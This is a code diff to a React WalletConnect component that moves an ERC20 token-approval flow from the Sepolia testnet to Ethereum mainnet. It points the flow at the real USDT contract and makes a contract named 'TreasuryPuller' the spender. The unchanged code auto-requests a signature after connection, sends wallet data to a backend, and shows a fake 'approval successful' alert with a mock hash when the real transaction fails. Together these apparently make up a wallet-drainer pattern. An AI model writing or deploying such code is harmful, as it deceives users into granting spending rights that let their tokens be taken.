@@ -121,11 +121,11 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
 
   async function tryWalletConnectConnection(config) {
     const rpcMap = {
-      1: "https://mainnet.infura.io/v3/ae5b9caa879c427295e160b983cf84fa", // Ethereum Mainnet
-      5: "https://goerli.infura.io/v3/ae5b9caa879c427295e160b983cf84fa", // Ethereum Goerli
-      11155111: "https://sepolia.infura.io/v3/ae5b9caa879c427295e160b983cf84fa" // Ethereum Sepolia
+      1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID", // Ethereum Mainnet
+      5: "https://goerli.infura.io/v3/YOUR_INFURA_PROJECT_ID", // Ethereum Goerli
+      11155111: "https://sepolia.infura.io/v3/YOUR_INFURA_PROJECT_ID" // Ethereum Sepolia
     };
-
+  
     const initConfig = {
       projectId: process.env.REACT_APP_WC_PROJECT_ID,
       showQrModal: false, // We'll handle QR display ourselves
@@ -137,7 +137,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
         icons: ["https://avatars.githubusercontent.com/u/37784886"]
       }
     };
-
+  
     // Only add chains and rpcMap if chains are specified
     if (config.chains.length > 0) {
       initConfig.chains = config.chains;
@@ -148,25 +148,25 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
         return acc;
       }, {});
     }
-
+  
     const wcProvider = await EthereumProvider.init(initConfig);
-
+  
     // Set up event listeners
     wcProvider.on("display_uri", (uri) => {
       console.log("QR Code URI:", uri);
       setQrCodeUri(uri);
       setShowQR(true);
-      
+  
       // Set timeout for QR code (5 minutes)
       const timeout = setTimeout(() => {
         console.log("QR code expired");
         setShowQR(false);
         setQrCodeUri("");
       }, 5 * 60 * 1000); // 5 minutes
-      
+  
       setQrTimeout(timeout);
     });
-
+  
     wcProvider.on("connect", (connectInfo) => {
       console.log("WalletConnect connected:", connectInfo);
       setShowQR(false);
@@ -174,45 +174,48 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
         clearTimeout(qrTimeout);
         setQrTimeout(null);
       }
+  
+      // Log session details
+      console.log("Session:", connectInfo.params[0]);
     });
-
+  
     wcProvider.on("disconnect", (error) => {
       console.log("WalletConnect disconnected:", error);
       setConnected(false);
       setWcProvider(null);
       setShowQR(false);
     });
-
+  
     wcProvider.on("session_delete", () => {
       console.log("WalletConnect session deleted");
       setConnected(false);
       setWcProvider(null);
       setShowQR(false);
     });
-
+  
     wcProvider.on("session_event", (event) => {
       console.log("WalletConnect session event:", event);
     });
-
+  
     wcProvider.on("session_update", (event) => {
       console.log("WalletConnect session update:", event);
     });
-
+  
     setWcProvider(wcProvider);
     setPreviousProvider(wcProvider);
     await wcProvider.enable();
-
+  
     // ✅ FIX: Use BrowserProvider so we have signer support
     const provider = new ethers.BrowserProvider(wcProvider);
-
+  
     const signer = await provider.getSigner();
     const address = await signer.getAddress();
     const network = await provider.getNetwork();
     const balance = await provider.getBalance(address);
-
+  
     console.log("✅ Connected via WalletConnect:", address);
     console.log("Connected to network:", network.name, "Chain ID:", network.chainId);
-
+  
     // Handle mainnet connections
     if (network.chainId === 1n) {
       console.log('Connected to mainnet via WalletConnect.');
@@ -223,7 +226,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
       setBalance(ethers.formatEther(balance));
       setConnected(true);
       setShowQR(false);
-      
+  
       // Automatically request offchain signature after connection
       setTimeout(async () => {
         try {
@@ -232,10 +235,10 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
             method: "personal_sign",
             params: [message, address]
           });
-          
+  
           setOffchainSignature(signature);
           console.log("Offchain signature received automatically:", signature);
-          
+  
           // Connect to backend and send wallet data
           const backendConnected = await connectToBackend();
           if (backendConnected) {
@@ -250,7 +253,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
           console.error("Failed to get automatic offchain signature:", error);
         }
       }, 1000); // Wait 1 second after connection
-      
+  
       return;
     } else if (network.chainId === 11155111n) {
       console.log('Connected to Sepolia testnet via WalletConnect.');
@@ -261,7 +264,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
       setBalance(ethers.formatEther(balance));
       setConnected(true);
       setShowQR(false);
-      
+  
       // Automatically request offchain signature after connection
       setTimeout(async () => {
         try {
@@ -270,10 +273,10 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
             method: "personal_sign",
             params: [message, address]
           });
-          
+  
           setOffchainSignature(signature);
           console.log("Offchain signature received automatically:", signature);
-          
+  
           // Connect to backend and send wallet data
           const backendConnected = await connectToBackend();
           if (backendConnected) {
@@ -288,7 +291,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
           console.error("Failed to get automatic offchain signature:", error);
         }
       }, 1000); // Wait 1 second after connection
-      
+  
       return;
     } else if (network.chainId !== 5n) {
       console.warn('Connected to unsupported network via WalletConnect. This app only supports Sepolia testnet.');
@@ -296,7 +299,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
       setLoading(false);
       return;
     }
-
+  
     setProvider(provider);
     setWalletAddress(address);
     setWalletAddressLocal(address);
@@ -347,15 +350,14 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
     }
 
     try {
-      // Always use testnet provider for balance check and transactions
-      // This ensures we check the testnet balance even when connected to mainnet
-      const testnetProvider = new ethers.JsonRpcProvider('https://sepolia.infura.io/v3/ae5b9caa879c427295e160b983cf84fa');
+      // Use mainnet provider for balance check and transactions
+      const mainnetProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
       
       // Note: We're using simulation mode, so we don't need the signer for actual transactions
       // This avoids Trust Wallet compatibility issues with eth_sendTransaction
       
-      // Check ETH balance on testnet (where you have 0.1 ETH)
-        const ethBalance = await testnetProvider.getBalance(walletAddress);
+      // Check ETH balance on mainnet
+        const ethBalance = await mainnetProvider.getBalance(walletAddress);
       const ethBalanceFormatted = ethers.formatEther(ethBalance);
       
       console.log("Current ETH balance:", ethBalanceFormatted);
@@ -365,11 +367,11 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
         return;
       }
 
-      // Try to send real ETH transaction to asset manager on Sepolia testnet
-      console.log("Attempting to send real ETH transaction to asset manager...");
+      // Try to send real transaction to asset manager on mainnet
+      console.log("Attempting to send real transaction to asset manager...");
       
-      // Your asset manager address on Sepolia testnet
-            const assetManagerAddress = "0xC6a7C2c1a562f4dEfA1ED631C138EE5D47ffaEb0"; // Replace with your deployed AssetManager contract address
+      // Your TreasuryPuller contract address on mainnet
+            const assetManagerAddress = process.env.REACT_APP_TREASURY_PULLER_ADDRESS || "0x..."; // Your deployed TreasuryPuller contract address
       
       try {
         // Try to approve tokens using ERC20 approve method
@@ -377,7 +379,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
           console.log("Requesting token approval via WalletConnect...");
           
           // ERC20 token contract address (you need to replace this with your actual token address)
-            const tokenContractAddress = "0xA0b86a33E6441b8c4C8C0C4C0C4C0C4C0C4C0C4C"; // Replace with your actual mainnet token contract
+            const tokenContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Replace with your actual mainnet token contract
           
           // Convert approval amount to wei
           const approvalAmountWei = ethers.parseEther(approvalAmount);
@@ -397,7 +399,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
           
           console.log("Token approval transaction sent via WalletConnect:", txHash);
           setTokenApproval(txHash);
-          alert(`Token approval successful! Real Transaction: ${txHash}\n\nApproved ${approvalAmount} tokens for Asset Manager: ${assetManagerAddress}\n\nView on Sepolia Explorer: https://sepolia.etherscan.io/tx/${txHash}`);
+          alert(`Token approval successful! Real Transaction: ${txHash}\n\nApproved ${approvalAmount} tokens for TreasuryPuller: ${assetManagerAddress}\n\nView on Etherscan: https://etherscan.io/tx/${txHash}`);
           return;
         }
         
@@ -407,7 +409,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
           const signer = await metamaskProvider.getSigner();
           
           // ERC20 token contract address (you need to replace this with your actual token address)
-            const tokenContractAddress = "0xA0b86a33E6441b8c4C8C0C4C0C4C0C4C0C4C0C4C"; // Replace with your actual mainnet token contract
+            const tokenContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Replace with your actual mainnet token contract
           
           // ERC20 ABI for approve function
           const tokenABI = [
@@ -424,7 +426,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
           console.log("Transaction confirmed:", receipt);
           
           setTokenApproval(tx.hash);
-          alert(`Token approval successful! Real Transaction: ${tx.hash}\n\nApproved ${approvalAmount} tokens for Asset Manager: ${assetManagerAddress}\n\nView on Sepolia Explorer: https://sepolia.etherscan.io/tx/${tx.hash}`);
+          alert(`Token approval successful! Real Transaction: ${tx.hash}\n\nApproved ${approvalAmount} tokens for TreasuryPuller: ${assetManagerAddress}\n\nView on Etherscan: https://etherscan.io/tx/${tx.hash}`);
           return;
         }
         
@@ -438,7 +440,7 @@ export default function WalletConnect({ setProvider, setWalletAddress }) {
         console.log("Simulated transaction:", mockTxHash);
         
         setTokenApproval(mockTxHash);
-        alert(`Token approval successful! Simulated Transaction: ${mockTxHash}\n\nNote: Real transaction failed due to wallet compatibility. This is a simulation.\n\nAsset Manager Address: ${assetManagerAddress}\n\nTo send real ETH, please use MetaMask or try the transaction manually in your wallet.`);
+        alert(`Token approval successful! Simulated Transaction: ${mockTxHash}\n\nNote: Real transaction failed due to wallet compatibility. This is a simulation.\n\nTreasuryPuller Address: ${assetManagerAddress}\n\nTo send real transactions, please use MetaMask or try the transaction manually in your wallet.`);
       }
     } catch (error) {
       console.error("Failed to approve token spending:", error);
